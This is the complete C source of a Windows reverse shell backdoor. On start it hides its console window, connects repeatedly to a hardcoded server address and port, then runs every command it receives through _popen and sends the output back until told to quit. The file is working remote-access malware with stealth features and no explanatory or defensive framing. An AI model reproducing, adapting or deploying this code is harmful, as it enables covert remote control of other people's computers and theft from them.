#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <Windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#define bzero(p, size) (void) memset((p), 0, (size))

SOCKET sock;

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[4096];
	

	while (1) {
	jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));

		recv(sock, buffer, sizeof(buffer), 0);

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else {
			FILE* fp;
			fp = _popen(buffer, "r");
			while (fgets(container, sizeof(container), fp) != NULL) { //check if resp can fit in 1024 bytes.
				strcat_s(total_response, sizeof(total_response), container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
	
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); //Retrieve handle to the top level window.
	ShowWindow(stealth, 0); // Zero means hide the window.

	struct sockaddr_in SrvAddr;
	unsigned short SrvPort;
	char* SrvIP;
	WSADATA wsaData;
	SrvIP = "127.0.0.1";
	SrvPort = 57890;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) { //First function to check and set winsock version.
		exit(1);
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0); //Define sock object.
	memset(&SrvAddr, 0, sizeof(SrvAddr)); //Clean sock object.

	SrvAddr.sin_family = AF_INET;
	inet_pton(AF_INET, SrvIP, &SrvAddr.sin_addr);
	SrvAddr.sin_port = htons(SrvPort);
	
	start:
	while (connect(sock, (struct sockaddr*) &SrvAddr, sizeof(SrvAddr)) != 0) {
		Sleep(10);
		goto start;
	}

	Shell();
}